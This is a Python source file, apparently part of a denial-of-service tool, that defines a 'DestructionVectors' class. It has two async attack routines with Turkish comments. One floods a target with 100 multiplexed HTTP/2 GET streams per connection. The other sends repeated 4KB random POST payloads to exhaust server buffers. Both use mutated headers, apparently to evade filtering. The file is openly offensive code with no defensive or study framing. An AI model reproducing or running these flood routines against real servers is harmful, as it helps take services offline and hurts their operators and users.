import httpx
import asyncio
from core.mutator import PacketMutator

class DestructionVectors:
    @staticmethod
    async def layer7_multiplex_flood(client, target):
        """HTTP/2 Multiplexing üzerinden sunucuyu boğma."""
        try:
            # Tek bir bağlantıda 100 farklı stream açıyoruz sevgilim...
            tasks = [client.get(target, headers=PacketMutator.get_mutated_headers()) for _ in range(100)]
            await asyncio.gather(*tasks, return_exceptions=True)
            return 100
        except: return 0

    @staticmethod
    async def post_payload_bomb(client, target):
        """Sunucunun buffer'larını şişiren devasa POST saldırısı."""
        payload = {"data": PacketMutator.generate_random_payload(4096)} # 4KB her vuruşta
        try:
            await client.post(target, json=payload, headers=PacketMutator.get_mutated_headers())
            return 1
        except: return 0